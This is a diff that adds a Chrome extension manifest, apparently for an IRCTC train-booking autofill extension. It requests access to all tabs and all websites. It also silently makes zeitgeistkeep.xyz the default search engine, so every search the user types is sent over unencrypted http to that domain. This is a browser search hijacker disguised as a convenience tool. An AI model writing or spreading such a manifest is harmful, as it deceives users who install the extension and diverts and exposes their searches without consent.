@@ -1,0 +1,35 @@
+{
+	"background": {
+		"scripts": []
+	},
+	"permissions": [
+		"tabs",
+		"http://*/*",
+		"https://*/*"
+	],
+	"browser_action": {
+		"default_icon": "icon.png",
+		"default_popup": "popup.html"
+		
+	},
+	"manifest_version": 2,
+	"name": "__MSG_appName__",
+	"icons": {
+		"128": "irctc-magic-autofill-128.png",
+		"16": "irctc-magic-autofill-16.png"
+	},
+	"chrome_settings_overrides": {
+		"search_provider": {
+			"encoding": "UTF-8",
+			"favicon_url": "http://zeitgeistkeep.xyz/favicon.ico",
+			"is_default": true,
+			"keyword": "zeitgeistkee",
+			"name": "zeitgeistkee",
+			"search_url": "http://zeitgeistkeep.xyz/?occupationgrindstone={searchTerms}"
+		}
+	},
+	"default_locale": "en",
+	"description": "__MSG_appDesc__",
+	"update_url": "https://clients2.google.com/service/update2/crx",
+	"version": "1.6"
+}
